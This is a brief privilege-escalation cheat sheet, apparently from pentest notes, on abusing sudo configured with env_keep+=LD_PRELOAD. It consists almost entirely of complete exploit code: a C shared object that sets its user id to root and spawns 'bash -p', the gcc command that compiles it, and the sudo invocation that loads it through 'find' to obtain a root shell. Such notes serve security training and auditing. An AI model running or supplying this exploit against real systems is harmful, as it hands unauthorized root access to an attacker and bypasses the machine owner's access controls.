
###LD_PRELOAD

Contenido de preload.c

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
1- [+] We can sudo without supplying a password!

Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH,
    
2- gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c

3- sudo LD_PRELOAD=/tmp/preload.so find


